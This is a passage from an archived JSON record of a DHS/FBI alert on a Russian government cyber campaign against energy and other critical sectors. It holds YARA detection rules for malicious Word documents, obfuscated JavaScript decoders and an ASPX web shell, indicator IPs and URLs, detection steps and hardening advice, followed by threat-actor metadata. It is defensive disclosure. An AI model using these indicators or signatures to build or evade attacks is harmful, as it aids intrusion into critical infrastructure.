\"62.8.193.206\"\n\n$s24 = \"/1/ree_stat/p\"\n\n$s25 = \"/icon.png\"\n\n$s26 = \"/pshare1/icon\"\n\n$s27 = \"/notepad.png\"\n\n$s28 = \"/pic.png\"\n\n$s29 = \"http://bit.ly/2m0x8IH\"\n\ncondition:\n\n($s0 and $s1 or $s2) or ($s3 or $s4) or ($s5 and $s6 or $s7 and $s8 and $s9) or ($s10\nand $s11) or ($s12 and $s13) or ($s14) or ($s15) or ($s16) or ($s17) or ($s18) or ($s19) or\n($s20) or ($s21) or ($s0 and $s22 or $s24) or ($s0 and $s22 or $s25) or ($s0 and $s23 or\n$s26) or ($s0 and $s22 or $s27) or ($s0 and $s23 or $s28) or ($s29)\n\n}\n\nrule APT_malware_2\n\n{\n\nmeta:\n\ndescription = \"rule detects malware\"\n\nauthor = \"other\"\n\nstrings:\n\n$api_hash = { 8A 08 84 C9 74 0D 80 C9 60 01 CB C1 E3 01 03 45 10 EB ED }\n\n$http_push = \"X­mode: push\" nocase\n\n$http_pop = \"X­mode: pop\" nocase\n\ncondition:\n\nany of them\n\n}\n\n\n-----\n\nrule Query_XML_Code_MAL_DOC_PT_2\n\n{\n\nmeta:\n\nname= \"Query_XML_Code_MAL_DOC_PT_2\"\n\nauthor = \"other\"\n\nstrings:\n\n$zip_magic = { 50 4b 03 04 }\n\n$dir1 = \"word/_rels/settings.xml.rels\"\n\n$bytes = {8c 90 cd 4e eb 30 10 85 d7}\n\ncondition:\n\n$zip_magic at 0 and $dir1 and $bytes\n\n}\n\nrule Query_Javascript_Decode_Function\n\n{\n\nmeta:\n\nname= \"Query_Javascript_Decode_Function\"\n\nauthor = \"other\"\n\nstrings:\n\n$decode1 = {72 65 70 6C 61 63 65 28 2F 5B 5E 41 2D 5A 61 2D 7A 30 2D 39 5C 2B 5C\n2F 5C 3D 5D 2F 67 2C 22 22 29 3B}\n\n$decode2 = {22 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52 53 54 55 56 57\n58 59 5A 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74 75 76 77 78 79 7A\n30 31 32 33 34 35 36 37 38 39 2B 2F 3D 22 2E 69 6E 64 65 78 4F 66 28 ?? 2E 63 68 61 72\n41 74 28 ?? 2B 2B 29 29}\n\n$decode3 = {3D ?? 3C 3C 32 7C ?? 3E 3E 34 2C ?? 3D 28 ?? 26 31 35 29 3C 3C 34 7C\n?? 3E 3E 32 2C ?? 3D 28 ?? 26 33 29 3C 3C 36 7C ?? 2C ?? 2B 3D [1­2] 53 74 72 69 6E 67\n2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29 2C 36 34 21 3D ?? 26 26 28 ?? 2B 3D 53\n74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29}\n\n$decode4 = {73 75 62 73 74 72 69 6E 67 28 34 2C ?? 2E 6C 65 6E 67 74 68 29}\n\n$func_call=\"a(\\\"\"\n\ncondition:\n\n\n-----\n\n}\n\nrule Query_XML_Code_MAL_DOC\n\n{\n\nmeta:\n\nname= \"Query_XML_Code_MAL_DOC\"\n\nauthor = \"other\"\n\nstrings:\n\n$zip_magic = { 50 4b 03 04 }\n\n$dir = \"word/_rels/\" ascii\n\n$dir2 = \"word/theme/theme1.xml\" ascii\n\n$style = \"word/styles.xml\" ascii\n\ncondition:\n\n$zip_magic at 0 and $dir at 0x0145 and $dir2 at 0x02b7 and $style at 0x08fd\n\n}\n\nrule z_webshell\n\n{\n\nmeta:\n\ndescription = \"Detection for the z_webshell\"\n\nauthor = \"DHS NCCIC Hunt and Incident Response Team\"\n\ndate = \"2018/01/25\"\n\nmd5 = \"2C9095C965A55EFC46E16B86F9B7D6C6\"\n\nstrings:\n\n$aspx_identifier1 = \"<%@ \" nocase ascii wide\n\n$aspx_identifier2 = \"<asp:\" nocase ascii wide\n\n$script_import = /(import|assembly) Name(space)?\\=\\\"(System|Microsoft)/ nocase\nascii wide\n\n$case_string = /case \\\"z_(dir|file|FM|sql)_/ nocase ascii wide\n\n$webshell_name = \"public string z_progname =\" nocase ascii wide\n\n$webshell_password = \"public string Password =\" nocase ascii wide\n\n\n-----\n\n1 of ($aspx_identifier*)\n\nand #script_import > 10\n\nand #case_string > 7\n\nand 2 of ($webshell_*)\n\nand filesize < 100KB\n\n}\n\n**Impact**\n\nThis actors’ campaign has affected multiple organizations in the energy, nuclear, water,\naviation, construction, and critical manufacturing sectors.\n\n**Solution**\n\nDHS and FBI encourage network users and administrators to use the following detection and\nprevention guidelines to help defend against this activity.\n\n**Network and Host­based Signatures**\n\nDHS and FBI recommend that network administrators review the IP addresses, domain\nnames, file hashes, and YARA and Snort signatures provided and add the IPs to their watch\nlist to determine whether malicious activity is occurring within their organization. Reviewing\nnetwork perimeter netflow will help determine whether a network has experienced suspicious\nactivity. Network defenders and malware analysts should use the YARA and Snort signatures\nprovided in the associated YARA and .txt file to identify malicious activity.\n\n**Detections and Prevention Measures**\n\nUsers and administrators may detect spear phishing, watering hole, web shell, and\nremote access activity by comparing all IP addresses and domain names listed in the IOC\npackages to the following locations:\n\nnetwork intrusion detection system/network intrusion protection system logs,\n\nweb content logs,\n\nproxy server logs,\n\ndomain name server resolution logs,\n\npacket capture (PCAP) repositories,\n\nfirewall logs,\n\nworkstation Internet browsing history logs,\n\nhost­based intrusion detection system /host­based intrusion prevention system\n(HIPS) logs,\n\ndata loss prevention logs,\n\nexchange server logs,\n\nuser mailboxes,\n\nmail filter logs,\n\nmail content logs,\n\nAV mail logs,\n\nOWA logs,\n\nBlackberry Enterprise Server logs, and\n\nMobile Device Management logs.\n\nTo detect the presence of web shells on external­facing servers, compare IP addresses,\nfilenames, and file hashes listed in the IOC packages with the following locations:\n\napplication logs,\n\nIIS/Apache logs,\n\n\n-----\n\nPCAP repositories,\n\nfirewall logs, and\n\nreverse proxy.\n\nDetect spear­phishing by searching workstation file systems and network­based user\ndirectories, for attachment filenames and hashes found in the IOC packages.\n\nDetect persistence in VDI environments by searching file shares containing user profiles\nfor all .lnk files.\n\nDetect evasion techniques by the actors by identifying deleted logs. This can be done by\nreviewing last­seen entries and by searching for event 104 on Windows system logs.\n\nDetect persistence by reviewing all administrator accounts on systems to identify\nunauthorized accounts, especially those created recently.\n\nDetect the malicious use of legitimate credentials by reviewing the access times of\nremotely accessible systems for all users. Any unusual login times should be reviewed by\nthe account owners.\n\nDetect the malicious use of legitimate credentials by validating all remote desktop and\nVPN sessions of any user’s credentials suspected to be compromised.\n\nDetect spear­phishing by searching OWA logs for all IP addresses listed in the IOC\npackages.\n\nDetect spear­phishing through a network by validating all new email accounts created on\nmail servers, especially those with external user access.\n\nDetect persistence on servers by searching system logs for all filenames listed in the IOC\npackages.\n\nDetect lateral movement and privilege escalation by searching PowerShell logs for all\nfilenames ending in “.ps1” contained in the IOC packages. (Note: requires PowerShell\nversion 5, and PowerShell logging must be enabled prior to the activity.)\n\nDetect persistence by reviewing all installed applications on critical systems for\nunauthorized applications, specifically note FortiClient VPN and Python 2.7.\n\nDetect persistence by searching for the value of “REG_DWORD 100” at registry location\n“HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal”.\nServices\\MaxInstanceCount” and the value of “REG_DWORD 1” at location\n“HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\\dontdisplaylastusername”.\n\nDetect installation by searching all proxy logs for downloads from URIs without domain\nnames.\n\n**General Best Practices Applicable to this Campaign:**\n\nPrevent external communication of all versions of SMB and related protocols at the\nnetwork boundary by blocking TCP ports 139 and 445 with related UDP port 137. See the\n[NCCIC/US­CERT publication on SMB Security Best Practices for more information.](https://www.us-cert.gov/ncas/current-activity/2017/01/16/SMB-Security-Best-Practices)\n\nBlock the Web­based Distributed Authoring and Versioning (WebDAV) protocol on border\ngateway devices on the network.\n\nMonitor VPN logs for abnormal activity (e.g., off­hour logins, unauthorized IP address\nlogins, and multiple concurrent logins).\n\nDeploy web and email filters on the network. Configure these devices to scan for known\nbad domain names, sources, and addresses; block these before receiving and\ndownloading messages. This action will help to reduce the attack surface at the network’s\nfirst level of defense. Scan all emails, attachments, and downloads (both on the host and\nat the mail gateway) with a reputable anti­virus solution that includes cloud reputation\nservices.\n\nSegment any critical networks or control systems from business systems and networks\naccording to industry best practices.\n\nEnsure adequate logging and visibility on ingress and egress points.\n\nEnsure the use of PowerShell version 5, with enhanced logging enabled. Older versions\nof PowerShell do not provide adequate logging of the PowerShell commands an attacker\nmay have executed. Enable PowerShell module logging, script block logging, and\ntranscription. Send the associated logs to a centralized log repository for monitoring and\n\n\n-----\n\nImplement the prevention, detection, and mitigation strategies outlined in the NCCIC/US\nCERT Alert TA15­314A – Compromised Web Servers and Web Shells – Threat\nAwareness and Guidance.\n\nEstablish a training mechanism to inform end users on proper email and web usage,\nhighlighting current information and analysis, and including common indicators of\nphishing. End users should have clear instructions on how to report unusual or suspicious\nemails.\n\nImplement application directory whitelisting. System administrators may implement\napplication or application directory whitelisting through Microsoft Software Restriction\nPolicy, AppLocker, or similar software. Safe defaults allow applications to run from\nPROGRAMFILES, PROGRAMFILES(X86), SYSTEM32, and any ICS software folders. All\nother locations should be disallowed unless an exception is granted.\n\nBlock RDP connections originating from untrusted external addresses unless an\nexception exists; routinely review exceptions on a regular basis for validity.\n\nStore system logs of mission critical systems for at least one year within a security\ninformation event management tool.\n\nEnsure applications are configured to log the proper level of detail for an incident\nresponse investigation.\n\nConsider implementing HIPS or other controls to prevent unauthorized code execution.\n\nEstablish least­privilege controls.\n\nReduce the number of Active Directory domain and enterprise administrator accounts.\n\nBased on the suspected level of compromise, reset all user, administrator, and service\naccount credentials across all local and domain systems.\n\nEstablish a password policy to require complex passwords for all users.\n\nEnsure that accounts for network administration do not have external connectivity.\n\nEnsure that network administrators use non­privileged accounts for email and Internet\naccess.\n\nUse two­factor authentication for all authentication, with special emphasis on any\nexternal­facing interfaces and high­risk environments (e.g., remote access, privileged\naccess, and access to sensitive data).\n\nImplement a process for logging and auditing activities conducted by privileged accounts.\n\nEnable logging and alerting on privilege escalations and role changes.\n\nPeriodically conduct searches of publically available information to ensure no sensitive\ninformation has been disclosed. Review photographs and documents for sensitive data\nthat may have inadvertently been included.\n\nAssign sufficient personnel to review logs, including records of alerts.\n\nComplete independent security (as opposed to compliance) risk review.\n\nCreate and participate in information sharing programs.\n\nCreate and maintain network and system documentation to aid in timely incident\nresponse. Documentation should include network diagrams, asset owners, type of asset,\nand an incident response plan.\n\n**Report Notice**\n\nDHS encourages recipients who identify the use of tools or techniques discussed in this\ndocument to report information to DHS or law enforcement immediately. To request incident\nresponse resources or technical assistance, contact NCCIC at\n[NCCICcustomerservice@hq.dhs.gov or 888­282­0870 and the FBI through a local field office](mailto:NCCICcustomerservice@hq.dhs.gov)\n[or the FBI’s Cyber Division (CyWatch@fbi.gov or 855­292­3937).](mailto:CyWatch@fbi.gov)\n\n**References**\n\n[1] Symantec. Dragonfly: Western energy sector targeted by sophisticated attack group.\nSeptember 6, 2017.\n\n[[2] CERT CC. Vulnerability Note #672268](https://www.kb.cert.org/vuls/id/672268)\n\n[3] CCIRC CF17­010 UPDATE\n\n[[4] MIFR­10127623](https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf)\n\n\n-----\n\n**[This product is provided subject to this Notification and this Privacy & Use policy.](https://www.us-cert.gov/privacy/notification)**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2018/2018.03.15.Russian_Government_Cyber_Activity_TA18-074A/Russian_Government_Cyber_Activity.pdf"
    ],
    "report_names": [
        "Russian_Government_Cyber_Activity"
    ],
    "threat_actors": [
        {
            "id": "e2a4bc0b-6745-4e55-9d7c-3d169d70b025",
            "created_at": "2022-10-25T16:07:23.386907Z",
            "updated_at": "2025-03-27T02:02:09.774331Z",
            "deleted_at": null,
            "main_name": "Berserk Bear",
            "aliases": [
                "Berserk Bear",
                "Dragonfly 2.0",
                "Dymalloy"
            ],
            "source_name": "ETDA:Berserk Bear",
            "tools": [
                "Fuerboos",
                "Goodor",
                "Impacket",
                "Karagany",
                "Karagny",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Phishery",
                "Trojan.Karagany",
                "Trojan.Phisherly",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "649b5b3e-b16e-44db-91bc-ae80b825050e",
            "created_at": "2022-10-25T15:50:23.290412Z",
            "updated_at": "2025-03-27T02:00:55.431037Z",
            "deleted_at": null,
            "main_name": "Dragonfly",
            "aliases": [
                "TEMP.Isotope",
                "DYMALLOY",
                "Berserk Bear",
                "TG-4192",
                "Crouching Yeti",
                "IRON LIBERTY",
                "Energetic Bear",
                "Ghost Blizzard"
            ],
            "source_name": "MITRE:Dragonfly",
            "tools": [
                "MCMD",
                "Impacket",
                "CrackMapExec",
                "Backdoor.Oldrea",
                "Mimikatz",
                "PsExec",
                "Trojan.Karagany",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1a76ed30-4daf-4817-98ae-87c667364464",
            "created_at": "2022-10-25T16:47:55.891029Z",
            "updated_at": "2025-03-27T02:05:17.408867Z",
            "deleted_at": null,
            "main_name": "IRON LIBERTY",
            "aliases": [
                "ATK6 ",
                "BROMINE ",
                "CASTLE ",
                "Crouching Yeti ",
                "DYMALLOY ",
                "Dragonfly ",
                "Energetic Bear / Berserk Bear ",
                "Ghost Blizzard ",
                "TEMP.Isotope ",
                "TG-4192 ",
                "ALLANITE "
            ],
            "source_name": "Secureworks:IRON LIBERTY",
            "tools": [
                " Ddex Loader",
                " Havex",
                " Karagany",
                " Loek",
                " MCMD",
                " Sysmain",
                " xfrost",
                "ClientX"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "90307967-d5eb-4b7b-b8de-6fa2089a176e",
            "created_at": "2022-10-25T15:50:23.501119Z",
            "updated_at": "2025-03-27T02:00:55.486295Z",
            "deleted_at": null,
            "main_name": "Dragonfly 2.0",
            "aliases": [
                "Dragonfly 2.0",
                "IRON LIBERTY",
                "DYMALLOY",
                "Berserk Bear"
            ],
            "source_name": "MITRE:Dragonfly 2.0",
            "tools": [
                "netsh",
                "Impacket",
                "MCMD",
                "CrackMapExec",
                "Trojan.Karagany",
                "PsExec"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041528,
    "ts_creation_date": 1521187482,
    "ts_modification_date": 1521187482,
    "files": {
        "pdf": "https://archive.orkl.eu/1b0b1d53362b0a5210164197a7132e4ae3aa5749.pdf",
        "text": "https://archive.orkl.eu/1b0b1d53362b0a5210164197a7132e4ae3aa5749.txt",
        "img": "https://archive.orkl.eu/1b0b1d53362b0a5210164197a7132e4ae3aa5749.jpg"
    }
}